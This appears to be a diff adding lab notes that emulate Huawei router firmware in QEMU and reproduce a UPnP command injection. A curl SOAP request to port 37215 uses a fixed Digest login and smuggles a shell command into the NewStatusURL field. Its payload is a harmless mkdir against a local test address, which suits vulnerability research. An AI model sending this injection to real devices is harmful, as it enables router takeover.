@@ -1,0 +1,36 @@
+service ssh start
+brctl addbr Virbr0
+ifconfig Virbr0 192.168.10.1/24 up
+apt install uml-utilities
+tunctl -t tap0
+ifconfig tap0 192.168.10.11/24 up
+brctl addif Virbr0 tap0
+cd home/test_usr
+qemu-system-mips -M malta -kernel vmlinux-2.6.32-5-4kc-malta -hda debian_squeeze_mips_standard.qcow2 -append "root=/dev/sda1 console=tty0" -netdev tap,id=tapnet,ifname=tap0,script=no -device rtl8139,netdev=tapnet -nographic
+ifconfig eth0 192.168.10.2/24 up
+ping 192.168.10.1 -c3
+
+scp -r squashfs-root/ root@192.168.10.2:~/
+
+mount -o bind /dev ./squashfs-root/dev
+mount -t proc /proc ./squashfs-root/proc
+
+
+chroot squashfs-root /bin/sh
+./bin/upnp
+./bin/mic
+
+ifconfig eth0 192.168.10.2/24 up
+ifconfig br0 192.168.10.11/24 up
+
+
+curl -X POST -H 'Authorization:Digest username=dslf-config, realm=HuaweiHomeGateway, nonce=88645cefb1f9ede0e336e3569d75ee30, uri=/ctrlt/DeviceUpgrade_1, response=3612f843a42db38f48f59d2a3597e19c, algorithm=MD5, qop=auth, nc=00000001, cnonce=248d1a2560100669' -d '<?xml version="1.0" ?>
+ <s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
+  <s:Body><u:Upgrade xmlns:u="urn:schemas-upnp-org:service:WANPPPConnection:1">
+   <NewStatusURL>;mkdir /qqqqqqqqqq;</NewStatusURL>
+   <NewDownloadURL>HUAWEIUPNP</NewDownloadURL>
+  </u:Upgrade>
+ </s:Body>
+</s:Envelope>' -D - http://192.168.10.2:37215/ctrlt/DeviceUpgrade_1
+
+qemu-system-mips -M malta -kernel vmlinux-2.6.32-5-4kc-malta -hda debian_squeeze_mips_standard.qcow2 -netdev user,id=mynet,hostfwd=::6666-:22,hostfwd=::6667-:443,hostfwd=::6668-:37215 -append "root=/dev/sda1 console=tty0" -device rtl8139,netdev=mynet -nographic
